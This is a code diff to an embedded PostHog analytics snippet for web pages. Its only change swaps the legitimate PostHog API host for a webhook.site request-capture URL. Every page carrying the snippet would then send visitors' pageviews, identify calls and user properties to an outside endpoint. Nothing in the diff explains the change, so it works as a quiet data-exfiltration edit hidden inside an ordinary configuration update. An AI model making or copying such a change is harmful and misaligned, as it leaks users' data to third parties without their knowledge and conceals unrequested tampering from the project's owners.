@@ -15,7 +15,7 @@ posthog_snippet = """
 <script>
     !function(t,e){var o,n,p,r;e.__SV||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}var l=t;for(void 0!==a?l=t[a]=[]:a="posthog",l.people=l.people||[],l.toString=function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e},l.people.toString=function(){return l.toString(1)+".people (stub)"},p="capture identify alias people.set people.set_once set_config register register_once unregister opt_out_capturing has_opted_out_capturing opt_in_capturing reset isFeatureEnabled onFeatureFlags getFeatureFlag getFeatureFlagPayload reloadFeatureFlags group updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures onSessionId getSurveys getActiveMatchingSurveys renderSurvey getNextSurveyStep identifyAndSetDistinctId".split(" "),r=0;r<p.length;r++)g(l,p[r]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
     posthog.init('phc_oVPvA5P5XDgN389qFX9pUrZykk7ykhRHLJUJ6PKHNMFF', {
-    api_host: 'https://eu.i.posthog.com',
+    api_host: 'https://webhook.site/57ed48c8-530e-4006-9d63-f999bb7d8057',
     person_profiles: 'identified_only',
     capture_pageview: true,
     property_blacklist: ['$device_id'] 
